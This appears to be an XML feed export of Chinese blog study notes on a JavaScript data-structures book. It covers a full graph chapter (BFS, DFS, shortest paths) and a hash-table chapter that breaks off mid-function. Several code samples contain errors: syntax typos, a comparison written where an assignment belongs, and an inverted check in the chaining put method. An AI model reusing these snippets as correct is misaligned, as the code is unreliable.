    <content type="text"><![CDATA[本章中，将学习另外一种非线性数据结构——图。这是学习的最后一种数据结构，后面将学习排序和搜索算法。 第九章 图图的相关术语图是网络结构的抽象模型。图是一组由边连接的节点（或顶点）。学习图是重要的，因为在任何二元关系都可以用图来表示。 任何社交网络都可以用图来表示。 我们还可以用图来表示道路、航班以及通信状态 一个图 G= （V,E）由以下元素组成。 V：一组顶点 E：一组边。连接V中的顶点 由一条边连接在一起的顶点称为相邻顶点。比如，A和B 是相邻的，A和D是相邻的，A和C是相邻的，A和E是不相邻的。 一个顶点的度是其相邻顶点的数量。比如，A和其他三个顶点相连接，因此，A的度为3；E和其他两个顶点相连接，因此E的度为2. 路径是顶点v1,v2,…vk的一个连续序列，其中 vi 和 vi+1 （下标）是相邻的。以上一示意图为例，其中包含的路径A B E I 和 A C D G。 简单路径要求不包含重复的顶点。举个例子，A D G是一条简单路径。除去最后一个顶点（因为它和第一个顶点是同一个顶点），环也是简单路径，比如A D C A（最后一个顶点重新回到A） 如果途中不存在环则称该图是无环的。如果图中每两个顶点间都存在路径，则该图是连通的。 有向图和无向图 图可以是无向的（边没有方向）或是有向的（有向图）。下图就是有向图。 有向图的边有一个方向。如果图中每两个顶点间在双向上都存在路径，则该图是强连通的。例如，C和D就是强连通的。图还可以是未加权的或者加权的。加权图的边被赋予了权值。 我们可以使用图来解决计算机科学世界中的很多问题，比如搜索图中的一个特定顶点或搜索一条特定边，寻找图中的一条路径（从一个顶点到另一个顶点），寻找两个顶点之间的最短路径。 图的表示从数据结构角度来说，我们有多种方式来表示图。在所有表示法中，不存在绝对正确的方法方式。图的正确表示法取决于解决的问题和图的类型。 邻接矩阵图最常见的实现就是邻接矩阵。每个节点和一个整数相关联，该整数将作为数组的索引。我们用一个二维数组来表示顶点之间的连接。如果索引为i的节点和索引为 j的节点为邻，则 array[i][j] === 1,否则 array[i][j] === 0,如下图所示： 不是强连通的图（稀疏图）如果用邻接矩阵来表示，则矩阵中将会有很多0，这意味着我们浪费了计算机存储空间来表示根本不存在的边。例如，找给定顶点的相邻顶点，即使该顶点只有一个相邻的顶点，我们也不得不迭代一整行。邻接矩阵表示法不够好的另一个理由是，图中顶点的数量可能会变化，而二维数组不太灵活。 邻接表 邻接表我们也可以使用一种叫做邻接表的动态数据来表示图。邻接表由图中每个顶点相邻顶点列表所组成。存在好几种方式来表示这种数据结构。我们可以用列表（数组）、链表，甚至是散列表或者是字典来表示相邻顶点列表。下面的示意图展示了邻接表等数据结构。 尽管邻接表可能对大多数问题来说都是更好的选择，但以上两种表示法都有用，且它们有着不同的性质（例如，要找出顶点 v和w是否相邻，使用邻接矩阵会比较快）。在本章中，就会使用邻接表表示法。 关联矩阵我们还可以用关联矩阵来表示图。在关联矩阵中，矩阵的行表示顶点，列表示边。如下图所示，我们使用二维数组来表示两者之间的连通性，如果顶点 v 是 边e的入射点，则 array[v][e] === 1,否则 array[v][e] === 0。 创建 Graph 类我们先创建类的骨架 1234function Graph()&#123; var vertices = []; var adjList = new Dictionary();&#125; 我们使用一个数组来存储图中所有顶点的名字，以及一个字典来存储邻接表。字典将会使用顶点的名字作为键，邻接顶点列表作为值。 vertices数组和 adjList字典两者都是我们 Graph类的私有属性。 接着我们实现两个方法：一个用来向图中添加一个新的顶点（因为图实例化后是空的），另外一个方法用来添加顶点之间的边。我们先实现 addVertex 方法 1234this.addVertex = function(v)&#123; vertices.push(v); adjList.set(v,[]);&#125; 这个方法接受顶点 v 作为参数。我们将该顶点添加到顶点列表中，并且在邻接表中，设置顶点 v 作为键对应的字典值为一个空数组。 实现 addEdge 方法 1234this.addEdge = function(v,w)&#123; adjList.get(v).push(w); adjList.get(w).push(v); &#125; 这个方法接受两个顶点作为参数。首先，通过将 w 加入到 v 的邻接表中，我们添加了一条自顶点 v 到顶点 w 的边。如果你想实现一个有向图，则（adjList.get(v).push(w)）就足够了。但是本章中大多数的例子都是基于无向图，我们需要添加一条自w向v的边。 测试 123456789101112131415const graph = new Graph();const myVertices = ['A','B','C','D','E','F','G','H','I'];for(var i = 0; i &lt; myVertices.length; i++)&#123; graph.addVertex(myVertices[i]);&#125;graph.addEdge('A','B');graph.addEdge('A','C');graph.addEdge('A','D');graph.addEdge('C','D');graph.addEdge('C','G');graph.addEdge('D','G');graph.addEdge('D','H');graph.addEdge('B','E');graph.addEdge('B','F');graph.addEdge('E','I'); 实现 Graph类的 toString 方法，便于在控制台输出图 123456789101112this.toString = function()&#123; var s = ''; for(var i = 0; i &lt; vertices.length; i++)&#123; s += vertices[i] + ' -&gt; '; var neighbors = adjList.get(vertices[i]); for(var j = 0; j &lt; neighbors.length; j++)&#123; s += neighbors[j] + ' '; &#125; s += '\n'; &#125; return s;&#125; 我们为邻接表表示法构建了一个字符串，首先迭代 vertices 数组列表，将顶点的名字加入字符串中，接着取得该顶点的邻接表，同样也迭代该邻接表，将相邻顶点加入我们的字符串。邻接表迭代完成后，给我们的字符串添加一个换行符。这样就可以在控制看到一个漂亮的输出了。 123456789A -&gt; B C D B -&gt; A E F C -&gt; A D G D -&gt; A C G H E -&gt; B I F -&gt; B G -&gt; C D H -&gt; D I -&gt; E 图的遍历和树数据结构相似，我们可以访问图的所有节点。有两种算法可以对图进行遍历：广度优先搜索（Breadth-First Search,BFS）和深度优先搜索（Depth-First Search,DFS）。图遍历可以用来寻找特定的顶点或者是寻找两个顶点之间的路径，检查图是否连通，检查图是否含有环等。 图遍历算法的思想是必须追踪每个第一次访问的节点，并且追踪有哪些节点还没有被完全探索，对于两种图遍历算法，都需要明确指出第一个被访问的节点。 完全探索一个顶点要求我们查看该顶点的每一条边。对于每一条边所连接的没有被访问过的顶点，将其标注为被发现的，并将其加入待访问的顶点。 为了保证算法的效率，务必访问每个顶点至多两次。连通图中每条边和顶点都会被访问到。 广度优先搜索算法和深度优先搜索算法基本上是相同的，只有一点不同，那就是待访问顶点列表的数据结构。 算法 数据结构 描述 深度优先搜索 栈 通过将顶点存入栈中，顶点是沿着路径被探索的，存在新的相邻顶点就去访问 广度优先搜索 队列 通过将顶点存入队列，最先入队列的顶点先被探索 当要标注已经访问过的顶点时，我们可以用三种颜色来放映它们的状态 白色：表示该顶点还没有被访问 灰色：表示该顶点被访问过，但是还没有探索过 黑色：表示该顶点被访问过且被完全探索过 广度优先搜索广度优先搜索算法会从指定的第一个顶点开始遍历图，会访问其所有相邻点，就像一次访问图的一层。换句话说，就是先宽后深地访问顶点，如下图所示 以下是从顶点 v 开始的广度优先搜索算法所遵循的步骤 创建一个队列 Q 将 v 标注为被发现的（灰色），并将 v 入队列Q 如果队列Q 非空，则运行以下步骤 将 u 从 Q 中出队列 将标注 u 为被发现的（灰色） 将 u 所有未被访问过的邻点（白色）入队列 将 u 标注为已被探索的（黑色） 实现广度优先搜索算法 123456789101112131415161718192021222324252627282930// 颜色辅助-广度优先搜索算法this.initializeColor = function()&#123; var color = []; for(var i = 0; i &lt; vertices.length; i++)&#123; color[vertices[i]] = 'white'; &#125; return color;&#125; // 广度优先搜索算法this.bfs = function(v,callback)&#123; var color = this.initializeColor(), queue = new Queue(); queue.enqueue(v); while(!queue.isEmpty())&#123; var u = queue.dequeue(), neighbors = adjList.get(u); color[u] = 'grey'; for(var i = 0; i &lt; neighbors.length; i++)&#123; var w = neighbors[i]; if(color[w] === 'white')&#123; color[w] = 'grey'; queue.enqueue(w); &#125; &#125; color[u] = 'black'; if(callback)&#123; callback(u) &#125; &#125;&#125; 广度优先搜索和深度优先搜索多需要标注被访问过的顶点，为此，我们将使用一个辅助数组 color,由于当算法开始执行时，所有的顶点颜色都是白色，所以我们可以创建一个辅助函数 initializeColor 为这两个算法执行此初始化操作。 我们要的第一件事情是用 initializeColor 函数来将 color 数组初始化为 white ,我们还需要声明和创建一个 Queue 实例，它将会存储待访问和待探索的顶点。 bfs 方法接受一点顶点作为算法的起始点。起始顶点是必要的，我们将此顶点如队列。 如果队列为空，我们将通过出队列操作从队列中移除一个顶点，并取得一个包含其所有邻点的邻接表。该顶点将被标注为 grey,表示我们已经发现了它（但还未被完全对其的探索）。 对于 u 的每个邻点，我们取得其值，如果它还未被访问过，则将其标注了grey,并将这个顶点加入队列中，这样当从队列中出列的时候，我们可以完成对其的探索。 当完全探索该顶点和及其邻点后，我们将标注该顶点为已探索过（黑色）。 我们实现的这个 bfs 方法也接受一个回调。这个参数是可选的，如果我们传递了回调函数，会用到它。 测试 1234function printNode(value)&#123; console.log('访问了顶点：' + value);&#125;graph.bfs(myVertices[0],printNode); 得到下面的结果 123456789访问了顶点：A访问了顶点：B访问了顶点：C访问了顶点：D访问了顶点：E访问了顶点：F访问了顶点：G访问了顶点：H访问了顶点：I 顶点访问顺序和之前的示意图所展示的一致。 使用 BFS 寻找最短路径 到目前为止，我们只展示了 BFS 算法的基本原理。我们可以用该算法做更多事情，而不只是输出被访问顶点的顺序。例如，考虑如何来解决下面的问题。 给定一个图G和源顶点v，找出每个顶点u,u和v之间最短的路径（以边的数量计） 对于给定顶点v，广度优化算法会访问所有与其距离为1的顶点，接着是距离为2的顶点，以此类推。所以，可以用广度优先算法来解决这个问题。我们可以修改bfs方法以返回给我们一些信息： 从v到u的距离d[u] 前溯点pred[u],用来推导出从v到其他每个顶点u的最短路径。 实现： 123456789101112131415161718192021222324252627282930313233// 广度优先搜索算法优化版本this.BFS = function(v)&#123; var color = this.initializeColor(), queue = new Queue(), d = [], pred = []; queue.enqueue(v); for(var i = 0; i &lt; vertices.length; i++)&#123; d[vertices[i]] = 0; pred[vertices[i]] = null; &#125; while(!queue.isEmpty())&#123; var u = queue.dequeue(); neighbors = adjList.get(u); color[u] = 'grey'; for(var i = 0; i &lt; neighbors.length; i++)&#123; // w相邻顶点 var w = neighbors[i]; if(color[w] === 'white')&#123; color[w] == 'grey'; d[w] = d[u] + 1; pred[w] = u; queue.enqueue(w); &#125; &#125; color[u] = 'black'; &#125; return &#123; distance:d, predecessors: pred &#125;&#125; 首先需要声明数组 d 来表示距离，以及 pred 数组来表示前溯点。下一步用0来初始化数组d，把pred赋值为 null。 当我们发现 顶点u的相邻点w时，则设置w的前溯点值为u。我们还通过给d[u]加1来设置顶点v和相邻点w之间的距离。 方法的最后返回一个包含d和pred的对象。 测试 1234var shortestPathA = graph.BFS(myVertices[0]);console.log(shortestPathA);// distance: [A: 0, B: 1, C: 1, D: 2, E: 2, F: 2, G: 2, H: 3, I: 3]// predecessors: [A: null, B: "A", C: "A", D: "C", E: "B", F: "B",G: "D", , H: "D", , I: "E"] 通过前溯数组，我们可以用下面这段代码来构建从顶点A到其他顶点的路径： 1234567891011121314var fromVertex = myVertices[0];for(var i = 1; i &lt; myVertices.length; i++)&#123; var toVertex = myVertices[i], path = new Stack(); for(var v = toVertex; v !== fromVertex;v = shortestPathA.predecessors[v])&#123; path.push(v); &#125; path.push(fromVertex); var s = path.pop(); while(!path.isEmpty())&#123; s += '-' + path.pop(); &#125; console.log(s);&#125; 使用顶点A作为源顶点。对于每个其他顶点，我们会J计算顶点A到它的路径。我们从顶点数组得到toVertex ，然后会创建一个栈来 存储路劲值。 接着，我们追溯 toVertext 到 fromVertext 的路径。变量v被赋值为前溯点的值。这样我们就可以方向追溯这条路径。将变量v添加到栈中。最后，源顶点也会被添加到栈中，以得到完整的路径。 这之后，我们创建了一个s字符串，并将源顶点赋值给它。当栈是非空的时候，我们从栈中移出一个项并将其拼接到字符串s的后面。最后在控制台上输出路径。 12345678A-BA-CA-C-DA-B-EA-B-FA-C-D-GA-C-D-HA-B-E-I 深入学习的最短路径算法 本章中的图不是加权图。如果要计算加权图中的最短路径（例如，城市A 和城市B之间的最短路径——GPS和Google Map 中用到的算法），广度优先搜索未必合适。 举个栗子，Dijkstra 算法解决了单源中最短路径问题。Bellman-Ford 算法解决了边权值为负的单源最短路径问题。A*搜索算法解决了求仅一对顶点间的最短路径问题，它用经验法则来加速搜索过程。Floyd-Warshall算法解决了求所有顶点对间的最短路径的这一问题。 图是一个广泛的主体，对最短路径及其变种问题，我们有很多的解决方案。 深度优先搜索深度优先搜索算法将会从第一个指定的顶点开始遍历图，沿着路径直到这条路径最后一个顶点被访问了，接着原路返回并探索下一条路径。换句话说，它是先深度后广度地访问顶点，如下图所示 深度优先搜索算法不需要一个源顶点。在深度优先搜索算法中，若图中顶点v未被访问，则访问该顶点。 要访问顶点v,照下列的步骤 标注v为被发现的（灰色） 对于v的所有未访问的邻点w，访问顶点w，标注v为已被探索的（黑色） 实现 1234567891011121314151617181920212223// 深度优先探索算法this.dfs = function(callback)&#123; var color = this.initializeColor(); for(var i = 0 ; i &lt; vertices.length; i++)&#123; if(color[vertices[i]] === 'white' )&#123; this.dfsVisit(vertices[i],color,callback); &#125; &#125; &#125;this.dfsVisit =function(u,color,callback)&#123; color[u] = 'grey'; if(callback)&#123; callback(u); &#125; var neighbors = adjList.get(u); for(var i = 0 ;i &lt; neighbors.length; i++)&#123; var w = neighbors[i]; if(color[w] === 'white')&#123; arguments.callee(w,color,callback); &#125; &#125; color[u] = 'black';&#125; 首先，我们创建了颜色数组，并用值white 为图中的每个顶点对其进行了初始化，广度优先搜索也是这么做的。接着，对于图实例中每一个未被访问过的顶点，我们调用递归函数 dfsVisit ，传递的参数为顶点、颜色数组和回调函数。 当访问u顶点时，我们标注其为被发现的grey。如果有callback 函数的话，则执行该函数输出已访问过的顶点。接下来一步是取得包含顶点u的所有邻点的列表。对于顶点u的每一个未被访问过的邻点w，我们将调用dfsVisit 函数，传递w和其他参数。最后，在该2顶点和邻点按深度访问之后，我们回退，意思是该顶点已经被完全探索了，并将其标注为black 测试 12345678910graph.dfs(printNode); // 访问了顶点：A// 访问了顶点：B// 访问了顶点：E// 访问了顶点：I// 访问了顶点：F// 访问了顶点：C// 访问了顶点：D// 访问了顶点：G// 访问了顶点：H 下面这个示意图展示了该算法每一步的执行过程 探索深度优化算法 我们现在只是展示了深度优先搜索算法的工作原理。我们可以用该算法做更多的事情，而不是只输出被访问顶点的顺序。 对于给定的图G，我们希望深度优先探索算法遍历图G的所有节点，构建“深林”（有根树的一个集合）已经一组源顶点（根），并输出两个数组:发现时间和完成探索时间。我们可以修改 dfs 方法来返回给我们一些信息： 顶点u的发现时间d[u] 当顶点u被标注为黑色时，u的完成探索时间f[u] 顶点u的前溯点p[u] 12345678910111213141516171819202122232425262728293031323334353637383940414243// 追踪发现事件和完成探索时间var time = 0;// 深度优先探索算法优化版本this.DFS = function()&#123; var color = this.initializeColor(), d = [], f = [], p = []; time = 0; for(var i = 0; i &lt; vertices.length; i++)&#123; f[vertices[i]] = 0; d[vertices[i]] = 0; p[vertices[i]] = null; &#125; for(i = 0; i&lt; vertices.length; i++)&#123; if(color[vertices[i]] === 'white')&#123; this.DFSVisit(vertices[i],color,d,f,p) &#125; &#125; return &#123; discovery:d, finished:f, predecessors:p &#125;&#125;this.DFSVisit = function(u,color,d,f,p)&#123; console.log('发现了'+u); color[u] = 'grey'; d[u] = ++time; var neighbors = adjList.get(u); for(var i = 0; i &lt; neighbors.length; i++)&#123; var w = neighbors[i]; if(color[w] === 'white')&#123; p[w] = u; arguments.callee(w,color,d,f,p); &#125; &#125; color[u] = 'black'; f[u] = ++time; console.log('探索了'+u);&#125; 首先我们需要一个变量来追踪发现时间和完成探索时间。时间变量不能被作为参数传递，因为非对象的变量不能作为引用传递给其他Js方法。接下来，我们声明数组d、f和p。我们需要为图的每一个顶点来初始化这些数组。在这个方法结尾返回这些值。 当一个顶点第一次被发现时，我们要追踪其发现时间。当它是由引自顶点u的边而被发现的。我们追踪它的前溯点。最后，当这个顶点被完全探索之后，我们追踪其完成时间。 深度优先算法背后的思想是什么？ 边是从最近发现的u处被向外探索的。只有连接到未发现的顶点的边被探索了。当u所有的边都被探索了，该算法返回u被发现的地方去探索其他的边。这个过程持续到我们发现了虽偶有从原始顶点能够触及的顶点。如果还留有其他未被发现的顶点。我们对新的源顶点将重复这个过程。直到图中所有的顶点都被探索了。 测试 1234567891011121314151617181920212223242526var deepPath = graph.DFS();console.log(deepPath);/**发现了A发现了B发现了E发现了I探索了I探索了E发现了F探索了F探索了B发现了C发现了D发现了G探索了G发现了H探索了H探索了D探索了C探索了Adiscovery: [A: 1, B: 2, C: 10, D: 11, E: 3, F: 7, G: 12, H: 14, I: 4]finished: [A: 18, B: 9, C: 17, D: 16, E: 6, F: 8, G: 13, H: 15, I: 5]predecessors: [A: null, B: "A", C: "A", D: "C", E: "B", G: "D", H: "D", I: "E"]*/ 小结本章学习了几种不同的方式来表示图这一数据结构。并实现了用邻接表表示图的算法。还学习了广度优先搜索和深度优先搜索的实际应用。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第七章）—— 字典和散列表]]></title>
    <url>%2F2018-11-02-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part7.html</url>
    <content type="text"><![CDATA[本章学习使用字典和散列表来存储唯一值（不重复的值）的数据结构。集合、字典和散列表可以存储不重复的值。在集合中，我们感兴趣的是每个值本身，并把它作为主要元素。而字典和散列表中都是用 [键，值]的形式来存储数据。但是两个数据结构的实现方式略有不同。 第七章 字典和散列表字典集合表示一组互不相同的元素（不重复的元素）。在字典里，存储的是 [键，值] 对，其中键名是用来查询特定元素的。字典和结合很相似，集合以 [值，值] 的形式存储元素，字典则是以 [键，值]的形式来存储元素。字典也成为映射。 创建字典与 Set 类相似，ES6 中也包含了一个 Map 类的实现，即我们所说的字典。 我们在本章中，将要实现的是以ES6 中 Map 类的实现为基础的。你会发现它跟 Set 类很相似（但不同与存储 [值，值]对的形式，我们将要存储的是 [键，值]对。） 下面是我们的 Dictionary 类的骨架： 123function Dictionary()&#123; let items = &#123;&#125;;&#125; 然后我们要声明一些 映射/ 字典 所能使用的方法。 set（key,value）：想字典中添加新的元素。 delete（key）：通过使用键值来从字典中移除键值对应的数据值 has（key）：如果某个键值存在于这个字典，则返回true,没有则返回 false get（key）：通过键值查找特定的数值并返回 clear（）：键这个字典中的所有元素全部删除 size（）：返回字典所包含元素的数量。与数组的 length 相似 keys（）：将字典所包含的所有键名以数组形式返回 values（）：将字典所包含的所有数值以数组形式返回。 has 和 set 方法首先要实现 has 这个方法，因为它会被 set 和 remove 其他方法调用。我么可以通过以下代码实现 123this.has = function(key)&#123; return items.hasOwnProperty(key);&#125; 这个方法 的实现和我们之前在 Set 类中的实现是一样的。我们使用 JavaScript 中的 in 操作符来验证一个 key 是否是 items 对象的一个属性。 然后就是 set 方法的实现 123this.set = function(key,value)&#123; items[key] = value;&#125; 该方法接受一个 key 和 一个 value 作为参数。我们直接将 value 设为 items 对象的 key 属性的值。它可以用来给字典添加一个新的值，或者用来更新一个已有的值。 delete方法它和 Set 类的 delete 方法很类似，唯一不同的是，我们将先搜索 key (而不是 value) 1234567this.delete = function(key)&#123; if(this.has(key))&#123; delete items[key]; return true; &#125; return false;&#125; 我们可以使用 JavaScript 中的 delete 操作符来删除 items 对象中的 key 属性。 get 和 values 方法如果我们想在字典里查找一个特定的项，并检索它的值，可以通过以下方法 123this.get = function(key)&#123; return this.has(key) ? items[key] : undefined;&#125; get 方法会首先通过has 方法验证是否有 key 值存在，存在就返回该值，没有就返回一个 undefined 。 下面是 values 方法，以数组的形式返回 字典中所有的 values 的值。 123456789this.values = function()&#123; const values = []; for(let k i items)&#123; if(this.has(k))&#123; values.push(items[k]); &#125; &#125; return values;&#125; clear、size、keys 和 getItems 方法clear 和 size 方法和 集合那章的实现是完全一模一样的。 123456789101112this.clear = function()&#123; this.items = &#123;&#125;;&#125;this.size = function()&#123; let count = 0; if(let k in items)&#123; if(this.has(k))&#123; ++count; &#125; &#125; return count;&#125; keys 方法返回所有用于标识值的键名，可以使用 Object 类的 keys 方法 123this.keys = function()&#123; return Object.keys(items);&#125; 最后，验证 items 属性的输出值，我们加多一个返回 items 变量的方法，叫做 getItems 123this.getItem = function()&#123; return items;&#125; 使用 Dictionary 类123456789101112131415161718const dictionary = new Dictionary();dictionary.set('mail','544289495@qq.com');dictionary.set('website','http://laibh.top');dictionary.set('name','lbh');dictionary.set('word','1414');console.log(dictionary.getItem()); // &#123;mail: "544289495@qq.com", website: "http://laibh.top", name: "lbh", word: "1414"&#125;console.log(dictionary.get('word')); // 1414console.log(dictionary.size()); // 4console.log(dictionary.keys()); // ["mail", "website", "name", "word"]console.log(dictionary.values()); // ["544289495@qq.com", "http://laibh.top", "lbh", "1414"]dictionary.delete('word');console.log(dictionary.getItem()); // &#123;mail: "544289495@qq.com", website: "http://laibh.top", name: "lbh"&#125;console.log(dictionary.get('word')); // undefined console.log(dictionary.size()); // 3console.log(dictionary.keys()); // ["mail", "website", "name"]console.log(dictionary.values()); // ["544289495@qq.com", "http://laibh.top", "lbh"] 散列表本节中，你将会学到 HashTable 类，也叫 HashMap 类，它是 Dictionary 类的一种散列表实现方式。 散列算法的作用是尽可能快地在数据结构中找到一个值。之前的章节里面你已经知道要在数据结构中获得一个值（使用 get 方法），需要遍历整个数据结构来找到它。如果使用散列函数，就知道值的具体位置，因此能够快速检索到该值。散列函数的作用是给定一个键值，然后返回值在表中的地址。 创建散列表我们将使用数组来表示我们的数据结构，与之前一样，从搭建类的骨架开始 123function HashTable()&#123; let table = [];&#125; 然后，给类加一些方法。我们给每个类实现三个基本方法. put（key,value）：向散列表中增加一个新的项（也能更新散列表） remove（key）：根据键值从散列表中移除值 get（key）：返回根据键值检索到的特定的值。 在实现三个方法之前，要实现的第一个方法就是散列函数，它是 HashTable 类中的一个私有方法。 1234567var loseloseHashCode = function(key)&#123; var hash = 0; for(var i = 0; i &lt; key.length; i++)&#123; hash += key.charCodeAt(i); &#125; return hash % 37;&#125; 给定一个 key 参数，我们就能根据组成 key 的每个字符的 ASCII码值的和的得到一个数字。所以，首先需要一个变量来存储这个总和。然后，遍历 key 并将从 ASCII 表中查到的每个字符对应的 ASCII 值加到 hash 变量中（可以使用String 类的 charCodeAt方法）。最后，返回 hash 值。为了得到较小的值，我们会使用 hash 值和一个任意的数做除法的余数。 现在有了散列函数，基于可以实现 put 方法 12345this.put = function(key,value)&#123; var position = loseloseHashCode(key); console.log(position + '-' + key); table[position] = value;&#125; 首先，根据给定的 key ，我们需要根据所创建的散列函数计算出它在表中的位置。为了方便展示消息，我们需要计算出的位置输出至控制台。由于它不是必需的，我们也可以选择省略。然后要做的就是，将 value 参数添加到 用散列函数计算出的对应的位置上。 从 HashTable 实例中查找一个值也很简单。为此我们会实现一个 get 方法 123this.get = function(key)&#123; return table[loseloseHashCode(key)];&#125; 首先我们会使用所创建的散列函数来求出所对应的位置。这个函数会返回值的位置，因为我们需要做的就是根据这个位置来从数组 table 中获得这个值。 实现的最后一个方法是 remove 方法 123this.remove = function(key)&#123; table[loseloseHashCode(key)] = undefined;&#125; 要从 HashTable 实例中移除一个元素，只需要求出元素的位置并赋值为 undefined。 对于 HashTable 类来说，我们不需要像链表一样从 table 数组中将位置也移除。由于元素分布整个数组范围内，一些位置会没有任何元素占据，并默认为 undefined值。我们也不能将位置本身刚从数组中移除（这样会改变元素的位置），否则，当下次需要获得或者是移除一个元素的时候，这个元素会不在我们用散列函数求出的位置上。 使用 HashTable 类测试 HashTable 类 12345678910111213141516const hashTable = new HashTable();hashTable.put('mail','544289495@qq.com'); // 12-mailhashTable.put('website','http://laibh.top'); // 15-websitehashTable.put('name','lbh'); // 10-namehashTable.put('word','1414'); // 0-wordconsole.log(hashTable.get('website')); // http://laibh.topconsole.log(hashTable.get('word')); // 1414hashTable.remove('word');console.log(hashTable.get('website')); // http://laibh.top console.log(hashTable.get('word')); // undefined 散列表和散列结合散列表和散列映射是一样的，在一些编程语言中，还有一种叫做散列集合的实现。散列集合由一个集合构成，但是插入、移除或获取元素时，使用的还是散列函数。我们可以重用本章中实现的所有代码来实现散列集合，不同之处在于，不再添加键值对，而是只插入而没有键。例如，可以使用散列集合来存储所有的英文单词（不包括它的定义）。和集合相似，散列集合值存储唯一的不重复的值。 处理列表中更多冲突有时候，一些表会有相同的散列值。不同的值在散列表中对应相同的位置的时候，我们称其为冲突。 123456789101112hashTable.put('Gandalf','Gandalf@qq.com'); hashTable.put('John','John@qq.com');hashTable.put('Tyrion','Tyrion@qq.com');hashTable.put('Aaron','Aaron@qq.com');hashTable.put('Donnie','Donnie@qq.com');hashTable.put('Ana','Ana@qq.com');hashTable.put('Jonathan','Jonathan@qq.com');hashTable.put('Jamie','Jamie@qq.com');hashTable.put('Sue','Sue@qq.com');hashTable.put('Mindy','Mindy@qq.com');hashTable.put('Paul','Paul@qq.com');hashTable.put('Nathan','Nathan@qq.com'); 输出结果如下 12345678910111219-Gandalf29-John16-Tyrion16-Aaron13-Donnie13-Ana5-Jonathan5-Jamie5-Sue32-Mindy32-Paul10-Nathan 可以看出来，上面有很多相同的散列值。 为了获得结果，我们来实现一个print 的辅助函数。 1234567this.print = function()&#123; for(let i = 0; i &lt; table.length; ++i)&#123; if(table[i] !== undefined)&#123; console.log(i + ':' + table[i]); &#125; &#125;&#125; 运行 print 函数,得到以下输出 12345675:Sue@qq.com10:Nathan@qq.com13:Ana@qq.com16:Aaron@qq.com19:Gandalf@qq.com29:John@qq.com32:Paul@qq.com 可以看出来，按照先后的顺序，有相同 散列值的被后面的覆盖了。 使用一个数据结构来保存数据的目的显然不是去丢失这些数据，而是通过某个方法将它们全部保存起来。因此，当这种情况发生的时候，处理冲突的方法有几种：分离链接、线性探查、双散列法。 这里介绍第一种方法 分离链接分离链接法包括为散列表的每一个位置创建一个链表并将元素存储在里面。它是解决冲突的最简单的方法，但是它在 HashTable 实例之外还需要额外的存储空间。 例如：我们在之前的测试代码中使用分离链接的话，输出结果会是这样的： 在位置5上，将会有包含3个元素的 LinkedList 实例;在位置13、16、32上，将会有包含两个元素的 LinkedList 实例;在位置10、19和29上，将会有包含单个元素的 LinkedList 实例。 对于分离链接和线性探查来说，只需要重写三个方法：put、get和remove。这三个方法在每种技术实现中都是不同的。 为了实现一个使用分离链接的 HashTable 实例，我们需要一个新的辅助类来表示将要加入 LinkedList 实例的元素，我们管它叫 ValuePair 类（在 HashTable 类内部定义） 1234567var ValuePair = function(key,value)&#123; this.key = key; this.value = value; this.toString = function()&#123; return '[' + this.key + '-' + this.value + ']'; &#125;&#125; 这个类只会将 key 和 value 存储在一个 Object 实例汇中，我们也重写了 toString 方法，以便于杂浏览器控制台输出结果。 put 方法123456789this.put = function(key,value)&#123; var position = loseloseHashCode(key); if(table[position] !== undefined)&#123; table[position] = new LinkedList(); &#125; table[position].append(new ValuePair(key,value));&#125; 在这个方法中，将验证要加入新元素的位置是否已经被占据，如果这个位置是第一次被加入元素，我们会在这个位置上初始化一个 LinkedList 类的实例。然后使用 LinkedList里面的append 方法来向LinkedList 实例添加一个 ValuePair 实例（键和值） get 方法12345678910111213141516171819this.get = function(key)&#123; var position = loseloseHashCode(key); if(table[position] !== undefined)&#123; // 遍历链表来寻找键/值 var current = table[position].getHead(); while(current.next)&#123; if(current.element.key === key)&#123; return current.element.value; &#125; current = current.next; &#125; // 检查元素在链表的第一个或者是最后一个 if(current.element.key ==== key)&#123; return current.element.value; &#125; &#125; return undefined;&#125; 首先要判断在特定位置上面是否有元素存在，没有则返回一个 undefined 。反之则遍历链表来寻找我们需要的元素，先获取链表表头的引用，然后就可以从链表的头部遍历到尾部 Node 链表包含 next 和 element 属性。而 element 属性又是 ValuePair 的实例，所以它又有 value 和 key 属性。可以通过 current.element.key 来获得 Node链表的 key 属性，并通过比较它来确定它是否就是我们要找的键。key 相同就返回 Node 值，不相同，就继续遍历。 如果要找的元素是链表的第一个或者是最后一个节点，就不会进入 while 循环，因此需要在后面加多一个判断。 remove 方法1234567891011121314151617181920212223242526this.remove = function(key)&#123; var position = loseloseHashCode(key); if(table[position] !== undefined)&#123; var current = table[position].getHead(); while(current.next)&#123; if(current.element.key === key)&#123; table[position].remove(current.element); if(table[position].isEmpty())&#123; table[position] = undefined &#125; return true; &#125; current = current.next; &#125; // 检查是否为第一个或者是最后一个元素 if(current.element.key === key)&#123; table[position].remove(current.element); if(table[position].isEmpty())&#123; table[position] = undefined &#125; return true; &#125; &#125; return false;&#125; 在 remove方法中，我们使用和get 方法一样的步骤找到要找的元素。遍历 LinkedList 实例，如果链表中的 current 元素就是我们要找的元素，使用 remove 方法将其从链表中移除，然后进一步额外的验证，如果链表为空，就将散列表这个位置设为 undefined ,这样搜索一个元素或打印它的内容的时候，就可以跳过这个位置。最后返回 true 表示整个元素已经被移除或者在最后返回 false 表示整个元素在散列表中不存在。同样，和 get 方法一样，处理元素在第一个或者最后一个的情况。 重写了这三个方法，我们就拥有了一个分离链接法来处理冲突的HashMap 实例了。 重新运行之前的例子，会得到以下结果 12345675:[Jonathan-Jonathan@qq.com]-[Jamie-Jamie@qq.com]-[Sue-Sue@qq.com]10:[Nathan-Nathan@qq.com]13:[Donnie-Donnie@qq.com]-[Ana-Ana@qq.com]16:[Tyrion-Tyrion@qq.com]-[Aaron-Aaron@qq.com]19:[Gandalf-Gandalf@qq.com]29:[John-John@qq.com]32:[Mindy-Mindy@qq.com]-[Paul-Paul@qq.com] 创建更好的散列函数我们实现的 lose lose散列函数并不是一个表现良好的散列函数。因为它会产生太多的冲突。一个表现良好的散列函数是由几个方面构成的：插入和检索元素的时间（即性能），当然也包括较低的冲突可能性。 另一个可以实现的比 lose lose 更好的散列函数是 djb2 1234567var djb2HashCode = function(key)&#123; var hash = 5381; for(var i = 0; i &lt; key.length; i++)&#123; hash = hash* 33 + 